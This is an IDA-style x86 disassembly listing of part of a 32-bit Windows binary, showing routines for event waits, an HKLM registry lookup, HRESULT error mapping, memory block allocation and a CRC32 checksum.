                mov     ebx, [ebp+arg_0]
                lea     esi, [ebx+4]
                mov     ecx, esi
                call    sub_19028
                test    eax, eax
                jz      loc_186DC
                mov     ecx, esi
                call    sub_19048
                test    eax, eax
                jl      loc_186DC
                call    dword ptr ds:10011F4h
                push    7530h
                mov     ecx, [ebx+14h]
                push    ecx
                call    dword ptr ds:100104Ch
                mov     esi, eax
                cmp     esi, edi
                jz      short loc_18640
                cmp     esi, 80h
                jz      short loc_18640
                call    dword ptr ds:1001144h
                cmp     eax, edi
                jle     short loc_18622
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_18622:                              ; CODE XREF: sub_18588+8E↑j
                mov     edi, eax
                test    edi, edi
                jl      short loc_186A7
                test    esi, esi
                jg      short loc_18630
                mov     edi, esi
                jmp     short loc_186A7
; ---------------------------------------------------------------------------

loc_18630:                              ; CODE XREF: sub_18588+A2↑j
                and     esi, 0FFFFh
                or      esi, 80070000h
                mov     edi, esi
                jmp     short loc_186A7
; ---------------------------------------------------------------------------

loc_18640:                              ; CODE XREF: sub_18588+7C↑j
                                        ; sub_18588+84↑j
                mov     [ebp+var_4], edi
                push    4E20h
                push    ebx
                lea     ecx, [ebx+7Ch]
                call    sub_1ABA8
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18691
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_20], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     edi, [ebp+var_20]
                cmp     edi, 0C00000FDh
                jnz     short loc_1867E
                call    dword ptr ds:10011F4h

loc_1867E:                              ; CODE XREF: sub_18588+EE↑j
                test    edi, edi
                jl      short loc_18687
                mov     edi, 80004005h

loc_18687:                              ; CODE XREF: sub_18588+F8↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     ebx, [ebp+arg_0]

loc_18691:                              ; CODE XREF: sub_18588+D0↑j
                test    edi, edi
                jl      short loc_1869D
                lea     edx, [ebx+7Ch]
                mov     [ebp+var_1C], edx
                jmp     short loc_186A7
; ---------------------------------------------------------------------------

loc_1869D:                              ; CODE XREF: sub_18588+10B↑j
                mov     eax, [ebx+14h]
                push    eax
                call    dword ptr ds:10010C4h

loc_186A7:                              ; CODE XREF: sub_18588+9E↑j
                                        ; sub_18588+A6↑j ...
                cmp     [ebp+var_1C], 0
                jnz     short loc_186BE
                lea     ecx, [ebp+var_1C]
                push    ecx
                mov     ecx, ebx
                call    sub_18098
                test    eax, eax
                jl      short loc_186BE
                mov     edi, eax

loc_186BE:                              ; CODE XREF: sub_18588+123↑j
                                        ; sub_18588+132↑j
                mov     edx, [ebp+arg_4]
                mov     eax, [ebp+var_1C]
                mov     [edx], eax
                mov     eax, edi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
; ---------------------------------------------------------------------------

loc_186DC:                              ; CODE XREF: sub_18588+4E↑j
                                        ; sub_18588+5D↑j
                mov     eax, 80004005h
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_18588       endp

; ---------------------------------------------------------------------------
                db 13h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_18708       proc near               ; CODE XREF: sub_18A58+70↓p
                mov     edi, edi
                push    esi
                mov     esi, ecx
                mov     eax, [esi+10h]
                mov     ecx, [eax+8]
                cmp     ecx, [eax+0Ch]
                push    edi
                jb      short loc_18752
                mov     ecx, [esi+8]
                test    ecx, ecx
                jz      short loc_1876C
                mov     edi, [esi]
                lea     edx, ds:10h[edi*4]
                push    edx
                call    sub_18CA8
                test    eax, eax
                jz      short loc_1876C
                mov     dword ptr [eax], 0
                mov     dword ptr [eax+4], 0
                mov     dword ptr [eax+8], 0
                mov     [eax+0Ch], edi
                mov     ecx, [esi+10h]
                mov     [ecx], eax
                mov     [esi+10h], eax

loc_18752:                              ; CODE XREF: sub_18708+F↑j
                mov     eax, [esi+10h]
                mov     ecx, [eax+8]
                lea     edx, [ecx+1]
                mov     [eax+8], edx
                mov     eax, [esi+10h]
                add     dword ptr [esi+4], 1
                pop     edi
                lea     eax, [eax+ecx*4+10h]
                pop     esi
                retn
; ---------------------------------------------------------------------------

loc_1876C:                              ; CODE XREF: sub_18708+16↑j
                                        ; sub_18708+29↑j
                pop     edi
                xor     eax, eax
                pop     esi
                retn
sub_18708       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_18778       proc near               ; CODE XREF: sub_1B098+3A↓p
                mov     edi, edi
                push    ebx
                push    esi
                mov     esi, ecx
                push    edi
                lea     ecx, [esi+4]
                mov     dword ptr [esi], 1001C9Ch
                call    sub_19008
                lea     ecx, [esi+0Ch]
                call    sub_18C98
                xor     ebx, ebx
                lea     edi, [esi+18h]
                push    40h ; '@'
                mov     [esi+10h], ebx
                mov     [esi+14h], ebx
                lea     eax, [edi+10h]
                push    ebx
                push    eax
                mov     [edi], ebx
                mov     [edi+4], ebx
                mov     [edi+8], ebx
                mov     dword ptr [edi+0Ch], 10h
                call    sub_16746
                add     esp, 0Ch
                mov     [esi+74h], edi
                mov     [esi+78h], edi
                push    4E20h
                lea     edi, [esi+7Ch]
                push    ebx
                mov     ecx, edi
                mov     dword ptr [esi+68h], 10h
                mov     [esi+6Ch], ebx
                mov     [esi+70h], ebx
                call    sub_1A278
                push    208h
                lea     ecx, [esi+0E10h]
                push    ebx
                push    ecx
                mov     [esi+1220h], ebx
                mov     [esi+1224h], ebx
                call    sub_16746
                push    208h
                lea     edx, [esi+1018h]
                push    ebx
                push    edx
                call    sub_16746
                add     esp, 18h
                push    esi
                mov     ecx, edi
                call    sub_19A48
                pop     edi
                mov     eax, esi
                pop     esi
                pop     ebx
                retn
sub_18778       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18828       proc near               ; CODE XREF: sub_18918:loc_18A27↓p

var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                mov     eax, [ebp+arg_0]
                test    eax, eax
                push    esi
                push    edi
                mov     edi, ecx
                mov     [ebp+var_4], 0
                jz      loc_188D1
                lea     ecx, [ebp+var_4]
                push    ecx
                push    1
                push    0
                push    eax
                push    80000002h
                call    dword ptr ds:1001000h
                test    eax, eax
                jnz     short loc_188CF
                mov     edx, [ebp+var_4]
                push    ebx
                push    104h
                lea     ebx, [edi+1018h]
                push    ebx
                push    1001CC8h
                push    edx
                call    sub_194D8
                mov     esi, eax
                test    esi, esi
                jl      short loc_188B1
                push    1001C60h
                push    ebx
                call    sub_14E89
                push    eax
                push    1001C8Ch
                lea     eax, [edi+0E10h]
                push    104h
                push    eax
                call    sub_18228
                mov     ecx, [ebp+var_4]
                add     esp, 18h
                push    ecx
                mov     esi, eax
                call    dword ptr ds:1001008h
                pop     ebx
                jmp     short loc_188D8
; ---------------------------------------------------------------------------

loc_188B1:                              ; CODE XREF: sub_18828+53↑j
                cmp     esi, 80070002h
                jnz     short loc_188C2
                mov     ecx, edi
                call    sub_18298
                mov     esi, eax

loc_188C2:                              ; CODE XREF: sub_18828+8F↑j
                mov     ecx, [ebp+var_4]
                push    ecx
                call    dword ptr ds:1001008h
                pop     ebx
                jmp     short loc_188D8
; ---------------------------------------------------------------------------

loc_188CF:                              ; CODE XREF: sub_18828+32↑j
                mov     ecx, edi

loc_188D1:                              ; CODE XREF: sub_18828+16↑j
                call    sub_18298
                mov     esi, eax

loc_188D8:                              ; CODE XREF: sub_18828+87↑j
                                        ; sub_18828+A5↑j
                test    esi, esi
                jge     short loc_18905
                push    208h
                lea     edx, [edi+1018h]
                push    0
                push    edx
                call    sub_16746
                push    208h
                push    0
                add     edi, 0E10h
                push    edi
                call    sub_16746
                add     esp, 18h

loc_18905:                              ; CODE XREF: sub_18828+B2↑j
                pop     edi
                mov     eax, esi
                pop     esi
                mov     esp, ebp
                pop     ebp
                retn    4
sub_18828       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18918       proc near

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                cmp     [ebp+arg_4], 0
                push    esi
                push    edi
                mov     edi, [ebp+arg_0]
                jz      short loc_18932
                mov     dword ptr [edi+1220h], 1

loc_18932:                              ; CODE XREF: sub_18918+E↑j
                lea     esi, [edi+4]
                mov     ecx, esi
                mov     [ebp+arg_4], esi
                call    sub_192D8
                test    eax, eax
                jz      loc_18A3B
                push    ebx
                lea     ebx, [edi+0Ch]
                mov     ecx, ebx
                call    sub_191F8
                mov     esi, eax
                test    esi, esi
                jl      loc_18A2E
                push    0
                push    0
                mov     [edi+70h], ebx
                mov     ebx, ds:1001168h
                push    0
                call    ebx
                test    eax, eax
                mov     [edi+10h], eax
                jnz     short loc_1898A
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_18988
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_18988:                              ; CODE XREF: sub_18918+64↑j
                mov     esi, eax

loc_1898A:                              ; CODE XREF: sub_18918+5A↑j
                test    esi, esi
                jl      loc_18A2E
                mov     eax, [edi+10h]
                push    2
                push    2
                push    eax
                call    dword ptr ds:10010C0h
                test    eax, eax
                jnz     short loc_189BA
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_189B8
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_189B8:                              ; CODE XREF: sub_18918+94↑j
                mov     esi, eax

loc_189BA:                              ; CODE XREF: sub_18918+8A↑j
                test    esi, esi
                jl      short loc_18A2E
                push    0
                push    0
                push    0
                call    ebx
                test    eax, eax
                mov     [edi+14h], eax
                jnz     short loc_189E3
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_189E1
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_189E1:                              ; CODE XREF: sub_18918+BD↑j
                mov     esi, eax

loc_189E3:                              ; CODE XREF: sub_18918+B3↑j
                test    esi, esi
                jl      short loc_18A2E
                mov     ecx, [edi+14h]
                push    2
                push    2
                push    ecx
                call    dword ptr ds:10010C0h
                test    eax, eax
                jnz     short loc_18A0F
                call    dword ptr ds:1001144h
                test    eax, eax
                jle     short loc_18A0D
                and     eax, 0FFFFh
                or      eax, 80070000h

loc_18A0D:                              ; CODE XREF: sub_18918+E9↑j
                mov     esi, eax

loc_18A0F:                              ; CODE XREF: sub_18918+DF↑j
                test    esi, esi
                jl      short loc_18A2E
                cmp     dword ptr [edi+1220h], 0
                mov     ecx, edi
                jz      short loc_18A22
                push    0
                jmp     short loc_18A27
; ---------------------------------------------------------------------------

loc_18A22:                              ; CODE XREF: sub_18918+104↑j
                push    1001C08h

loc_18A27:                              ; CODE XREF: sub_18918+108↑j
                call    sub_18828
                mov     esi, eax

loc_18A2E:                              ; CODE XREF: sub_18918+3E↑j
                                        ; sub_18918+74↑j ...
                mov     ecx, [ebp+arg_4]
                push    esi
                call    sub_19328
                mov     esi, [ebp+arg_4]
                pop     ebx

loc_18A3B:                              ; CODE XREF: sub_18918+29↑j
                call    sub_19058
                mov     ecx, esi
                call    sub_19048
                pop     edi
                pop     esi
                pop     ebp
                retn    8
sub_18918       endp

; ---------------------------------------------------------------------------
                db 0Bh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18A58       proc near               ; CODE XREF: sub_18B68+8E↓p
                                        ; sub_18B68+F9↓p

var_2C          = byte ptr -2Ch
var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AB38h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 1Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     edi, ecx
                xor     ebx, ebx
                mov     [ebp+var_1C], ebx
                mov     [ebp+var_20], ebx
                mov     [ebp+var_4], ebx
                lea     eax, [edi+18h]
                push    eax
                lea     ecx, [ebp+var_2C]
                call    sub_17D68
                mov     edi, edi

loc_18AA8:                              ; CODE XREF: sub_18A58+67↓j
                lea     ecx, [ebp+var_2C]
                call    sub_181E8
                mov     esi, eax
                test    esi, esi
                jz      short loc_18AC5
                mov     ecx, esi
                call    sub_18F78
                test    eax, eax
                jnz     short loc_18AA8
                test    esi, esi
                jnz     short loc_18AD3

loc_18AC5:                              ; CODE XREF: sub_18A58+5C↑j
                lea     ecx, [edi+68h]
                call    sub_18708
                mov     esi, eax
                test    esi, esi
                jz      short loc_18AF5

loc_18AD3:                              ; CODE XREF: sub_18A58+6B↑j
                push    esi
                mov     ecx, edi
                call    sub_17F58
                mov     ecx, [ebp+arg_0]
                push    ecx
                mov     ecx, esi
                call    sub_18EB8
                mov     [ebp+var_1C], eax
                mov     [ebp+var_20], esi
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18B3F
; ---------------------------------------------------------------------------

loc_18AF5:                              ; CODE XREF: sub_18A58+79↑j
                mov     eax, 8007000Eh
                mov     [ebp+var_1C], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18B3F
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_24], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_24]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_18B2C
                call    dword ptr ds:10011F4h

loc_18B2C:                              ; CODE XREF: sub_18A58+CC↑j
                test    esi, esi
                jl      short loc_18B35
                mov     ebx, 80004005h

loc_18B35:                              ; CODE XREF: sub_18A58+D6↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]

loc_18B3F:                              ; CODE XREF: sub_18A58+9B↑j
                                        ; sub_18A58+AC↑j
                mov     edx, [ebp+arg_4]
                mov     ecx, [ebp+var_20]
                mov     [edx], ecx
                test    eax, eax
                jl      short loc_18B4D
                mov     eax, ebx

loc_18B4D:                              ; CODE XREF: sub_18A58+F1↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    8
sub_18A58       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18B68       proc near

var_24          = dword ptr -24h
var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AB58h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 14h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                xor     ebx, ebx
                mov     [ebp+var_20], ebx
                mov     [ebp+var_1C], ebx
                mov     edi, [ebp+arg_0]
                lea     ecx, [edi+4]
                call    sub_19028
                test    eax, eax
                jz      loc_18C57
                push    0FFFFFFFFh
                mov     eax, [edi+10h]
                push    eax
                call    dword ptr ds:100104Ch
                cmp     eax, ebx
                jz      short loc_18BE9
                cmp     eax, 80h
                jz      short loc_18BE9
                call    dword ptr ds:1001144h
                cmp     eax, ebx
                jle     loc_18C66
                and     eax, 0FFFFh
                or      eax, 80070000h
                jmp     short loc_18C66
; ---------------------------------------------------------------------------

loc_18BE9:                              ; CODE XREF: sub_18B68+5E↑j
                                        ; sub_18B68+65↑j
                mov     [ebp+var_4], ebx
                lea     ecx, [ebp+var_1C]
                push    ecx
                mov     edx, [ebp+arg_4]
                push    edx
                mov     ecx, edi
                call    sub_18A58
                mov     esi, eax
                mov     [ebp+var_20], esi
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18C45
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_24], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_24]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_18C2F
                call    dword ptr ds:10011F4h

loc_18C2F:                              ; CODE XREF: sub_18B68+BF↑j
                test    esi, esi
                jl      short loc_18C38
                mov     ebx, 80004005h

loc_18C38:                              ; CODE XREF: sub_18B68+C9↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     edi, [ebp+arg_0]
                mov     esi, [ebp+var_20]

loc_18C45:                              ; CODE XREF: sub_18B68+9F↑j
                test    esi, esi
                jl      short loc_18C4B
                mov     esi, ebx

loc_18C4B:                              ; CODE XREF: sub_18B68+DF↑j
                mov     eax, [edi+10h]
                push    eax
                call    dword ptr ds:10010C4h
                jmp     short loc_18C68
; ---------------------------------------------------------------------------

loc_18C57:                              ; CODE XREF: sub_18B68+4A↑j
                lea     ecx, [ebp+var_1C]
                push    ecx
                mov     edx, [ebp+arg_4]
                push    edx
                mov     ecx, edi
                call    sub_18A58

loc_18C66:                              ; CODE XREF: sub_18B68+6F↑j
                                        ; sub_18B68+7F↑j
                mov     esi, eax

loc_18C68:                              ; CODE XREF: sub_18B68+ED↑j
                mov     eax, [ebp+arg_8]
                mov     ecx, [ebp+var_1C]
                mov     [eax], ecx
                mov     eax, esi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    0Ch
sub_18B68       endp

; ---------------------------------------------------------------------------
                db 12h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_18C98       proc near               ; CODE XREF: sub_18778+18↑p
                mov     eax, ecx
                mov     dword ptr [eax], 0
                retn
sub_18C98       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18CA8       proc near               ; CODE XREF: sub_17DA8+C↑p
                                        ; sub_18098+13↑p ...

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AB78h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     [ebp+var_1C], 0
                xor     esi, esi
                mov     [ebp+var_4], esi
                mov     eax, [ebp+arg_0]
                push    eax
                push    esi
                mov     ecx, [ecx]
                push    ecx
                call    dword ptr ds:10010B4h
                mov     [ebp+var_1C], eax
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18D3A
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_20], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_20]
                cmp     esi, 0C00000FDh
                jnz     short loc_18D27
                call    dword ptr ds:10011F4h

loc_18D27:                              ; CODE XREF: sub_18CA8+77↑j
                test    esi, esi
                jl      short loc_18D30
                mov     esi, 80004005h

loc_18D30:                              ; CODE XREF: sub_18CA8+81↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, [ebp+var_1C]

loc_18D3A:                              ; CODE XREF: sub_18CA8+59↑j
                test    esi, esi
                jge     short loc_18D40
                xor     eax, eax

loc_18D40:                              ; CODE XREF: sub_18CA8+94↑j
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_18CA8       endp

; ---------------------------------------------------------------------------
                db 14h dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18D68       proc near               ; CODE XREF: sub_17DC8+10↑p
                                        ; sub_18108+B7↑p ...

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100AB98h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     [ebp+var_4], 0
                mov     eax, [ebp+arg_0]
                push    eax
                push    0
                mov     ecx, [ecx]
                push    ecx
                call    dword ptr ds:10010B0h
                jmp     short loc_18DD7
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_1C], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                cmp     [ebp+var_1C], 0C00000FDh
                jnz     short loc_18DD7
                call    dword ptr ds:10011F4h

loc_18DD7:                              ; CODE XREF: sub_18D68+4B↑j
                                        ; sub_18D68+67↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_18D68       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================


sub_18DF8       proc near               ; CODE XREF: sub_17F58+12↑p
                mov     eax, ecx
                mov     dword ptr [eax], 0
                retn
sub_18DF8       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18E08       proc near               ; CODE XREF: sub_18EB8+37↓p

var_20          = dword ptr -20h
var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ABB8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 10h
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                mov     [ebp+var_20], esi
                xor     edi, edi
                mov     [ebp+var_4], edi
                mov     eax, [esi]
                test    eax, eax
                jz      short loc_18E55
                mov     ecx, [eax]
                push    eax
                mov     edx, [ecx+8]
                call    edx

loc_18E55:                              ; CODE XREF: sub_18E08+43↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                jmp     short loc_18E97
; ---------------------------------------------------------------------------
                mov     eax, [ebp+var_14]
                mov     ecx, [eax]
                mov     edx, [ecx]
                mov     [ebp+var_1C], edx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_1C]
                mov     edi, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_18E84
                call    dword ptr ds:10011F4h

loc_18E84:                              ; CODE XREF: sub_18E08+74↑j
                test    esi, esi
                jl      short loc_18E8D
                mov     edi, 80004005h

loc_18E8D:                              ; CODE XREF: sub_18E08+7E↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     esi, [ebp+var_20]

loc_18E97:                              ; CODE XREF: sub_18E08+54↑j
                mov     dword ptr [esi], 0
                mov     eax, edi
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
sub_18E08       endp

; ---------------------------------------------------------------------------
                align 8

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18EB8       proc near               ; CODE XREF: sub_17BB8+3E↑p
                                        ; sub_18A58+89↑p

var_1C          = dword ptr -1Ch
var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    0FFFFFFFEh
                push    100ABD8h
                push    1005AB7h
                mov     eax, large fs:0
                push    eax
                sub     esp, 0Ch
                push    ebx
                push    esi
                push    edi
                mov     eax, ds:100C088h
                xor     [ebp+var_8], eax
                xor     eax, ebp
                push    eax
                lea     eax, [ebp+var_10]
                mov     large fs:0, eax
                mov     [ebp+var_18], esp
                mov     esi, ecx
                call    sub_18E08
                xor     ebx, ebx
                mov     [ebp+var_4], ebx
                mov     edi, [ebp+arg_0]
                cmp     edi, ebx
                jz      short loc_18F08
                mov     eax, [edi]
                push    edi
                mov     ecx, [eax+4]
                call    ecx

loc_18F08:                              ; CODE XREF: sub_18EB8+46↑j
                mov     [esi], edi
                jmp     short loc_18F3B
; ---------------------------------------------------------------------------
                mov     edx, [ebp+var_14]
                mov     eax, [edx]
                mov     ecx, [eax]
                mov     [ebp+var_1C], ecx
                mov     eax, 1
                retn
; ---------------------------------------------------------------------------
                mov     esp, [ebp+var_18]
                mov     esi, [ebp+var_1C]
                mov     ebx, esi
                cmp     esi, 0C00000FDh
                jnz     short loc_18F32
                call    dword ptr ds:10011F4h

loc_18F32:                              ; CODE XREF: sub_18EB8+72↑j
                test    esi, esi
                jl      short loc_18F3B
                mov     ebx, 80004005h

loc_18F3B:                              ; CODE XREF: sub_18EB8+52↑j
                                        ; sub_18EB8+7C↑j
                mov     [ebp+var_4], 0FFFFFFFEh
                mov     eax, ebx
                mov     ecx, [ebp+var_10]
                mov     large fs:0, ecx
                pop     ecx
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn    4
sub_18EB8       endp

; ---------------------------------------------------------------------------
                db 10h dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_18F68       proc near               ; CODE XREF: sub_17F78+80↑p
                mov     dword ptr [ecx], 0
                retn
sub_18F68       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_18F78       proc near               ; CODE XREF: sub_17DE8+44↑p
                                        ; sub_17DE8+56↑p ...
                mov     eax, [ecx]
                retn
sub_18F78       endp

; ---------------------------------------------------------------------------
                db 0Dh dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18F88       proc near               ; CODE XREF: sub_18FC8+27↓p
                                        ; sub_199D8+1A↓p ...

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     ecx, [ebp+arg_4]
                or      eax, 0FFFFFFFFh
                test    ecx, ecx
                push    esi
                mov     esi, [ebp+arg_0]
                jbe     short loc_18FBA

loc_18F9B:                              ; CODE XREF: sub_18F88+30↓j
                movzx   edx, byte ptr [esi]
                xor     edx, eax
                and     edx, 0FFh
                shr     eax, 8
                xor     eax, ds:1001CE0h[edx*4]
                sub     ecx, 1
                add     esi, 1
                test    ecx, ecx
                ja      short loc_18F9B

loc_18FBA:                              ; CODE XREF: sub_18F88+11↑j
                pop     esi
                pop     ebp
                retn    8
sub_18F88       endp

; ---------------------------------------------------------------------------
                db 9 dup(0CCh)

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_18FC8       proc near               ; CODE XREF: sub_1A558+51↓p
                                        ; sub_1A558+5D↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     edx, [ebp+arg_0]
                xor     eax, eax
                test    edx, edx
                jz      short loc_18FF5
                mov     eax, edx
                push    esi
                lea     esi, [eax+2]

loc_18FDC:                              ; CODE XREF: sub_18FC8+1D↓j
                mov     cx, [eax]
                add     eax, 2
                test    cx, cx
                jnz     short loc_18FDC
                sub     eax, esi
                sar     eax, 1
                add     eax, eax
                push    eax
                push    edx
                call    sub_18F88
                pop     esi

loc_18FF5:                              ; CODE XREF: sub_18FC8+C↑j
                pop     ebp
                retn    4
sub_18FC8       endp

; ---------------------------------------------------------------------------
                db 0Fh dup(0CCh)

; =============== S U B R O U T I N E =======================================


sub_19008       proc near               ; CODE XREF: sub_18778+10↑p
                mov     eax, ecx
                mov     dword ptr [eax], 0
                mov     dword ptr [eax+4], 0
                retn
sub_19008       endp

